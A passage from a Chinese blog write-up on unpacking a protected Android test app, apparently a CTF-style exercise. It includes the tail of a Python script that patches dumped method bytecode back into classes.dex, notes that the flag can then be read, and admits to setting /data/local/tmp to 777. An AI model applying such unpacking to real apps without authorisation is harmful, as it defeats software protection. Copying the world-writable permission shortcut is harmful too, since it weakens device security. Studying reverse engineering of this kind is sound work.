patched:</div><div class="line"></div><div class="line">            #获取要patch的目标地址</div><div class="line">            addr = get_method_addr(method_data, signature_str)</div><div class="line">            if addr == -1:</div><div class="line">                print &quot;&#123;&#125; can&apos;t get insns addr&quot;.format(signature_str)</div><div class="line">                continue</div><div class="line">            #do patch</div><div class="line">            print &quot;patch &quot; + signature_str,</div><div class="line">            patch(addr,item[&apos;data_offset&apos;],item[&apos;code_size&apos;])</div><div class="line">            patched.append(signature_str)</div><div class="line"></div><div class="line">    # print patched</div><div class="line">    # for i in patched:</div><div class="line">    #     print i</div><div class="line"></div><div class="line">import pprint</div><div class="line"></div><div class="line">patch_dex(&quot;F:\code_workplace\ida_script\jiajiatest_dump_20406&quot;,&quot;F:\code_workplace\ida_script\classes.dex&quot; )</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    print &quot;comming main&quot;</div><div class="line">    # parse_dump_data(&quot;F:\code_workplace\ida_script\jiajiatest_dump_20406&quot;)</div><div class="line">    # patch_dex(&quot;F:\code_workplace\ida_script\jiajiatest_dump_20406&quot;,&quot;F:\code_workplace\ida_script\classes.dex&quot; )</div><div class="line">    # dex_obj = dex.dex_parser(&quot;F:\code_workplace\ida_script\classes.dex&quot;)</div><div class="line">    # class_data = dex_obj.get_class_data()</div><div class="line">    # pprint.pprint(class_data)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">    # parse_meta_data(&quot;-------------- (KL)resolving [class=Lcom/example/jiajiatest/HttpRunner;, method=makeImgHttpGET, methodIndex=13, insSize=2, insns_d=6daf04d8, codeSize=270] in pid: 20406(name: task_name)&quot;)</div></pre></td></tr></table></figure>
<p>patch前后对比：</p>
<p>patch前</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508763745193jfvdw2et.png?imageslim" alt="raw"><br>patch后</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1508763780531bdpdup3e.png?imageslim" alt="paste image"></p>
<p>这时已经可以看到程序的主体逻辑了。然后查看字符串就可以拿到flag………</p>
<h3 id="我干的傻事"><a href="#我干的傻事" class="headerlink" title="我干的傻事"></a>我干的傻事</h3><ul>
<li><p>代码循环条件忘记写了，导致越界，一打开应用就报错。 </p>
</li>
<li><p>文件打开失败，貌似是权限问题，我直接暴力把 <code>/data/local/tmp</code> 改成 777</p>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p> 分析安卓底层代码的错误，要关注 <code>logcat</code> 日志，找到出问题的代码点，然后把库的带符号版本放到ida中分析<br>分析bug, 要看代码的关键逻辑， 判断条件等。</p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>要多实践，如有问题请在下面评论。</p>
]]></content>
      
        <categories>
            
            <category> 安卓安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 安卓脱壳 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
